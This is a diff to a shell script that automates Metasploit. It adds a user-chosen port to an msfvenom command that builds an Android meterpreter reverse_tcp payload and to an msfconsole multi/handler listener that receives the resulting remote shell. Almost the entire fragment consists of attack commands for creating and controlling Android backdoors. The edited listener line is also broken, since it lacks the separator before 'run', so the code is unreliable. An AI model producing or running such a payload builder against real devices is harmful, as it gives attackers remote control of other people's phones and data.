@@ -96,10 +96,11 @@ echo ''
 echo ''
 sleep 0.2s
 read -p 'please Enter your host : ' ip 
+read -p 'please Enter your port : ' port
 echo ""
 sleep 0.2s
 read -p 'please Enter payload name : ' path 
-msf="msfvenom -p android/meterpreter/reverse_tcp Lhost=$ip Lport=4444 -o $path"
+msf="msfvenom -p android/meterpreter/reverse_tcp Lhost=$ip Lport=$port -o $path"
 sleep 3s 
 clear
 sleep 0.2s
@@ -137,7 +138,7 @@ elif [ $ch == 2 ]; then
     sleep 1s
     clear
     echo -e "$green starting listener please wait ..."
-    msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0; run"
+    msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0;set lport $port run"
 elif [ $ch == 3 ]; then 
     sleep 1s
     clear
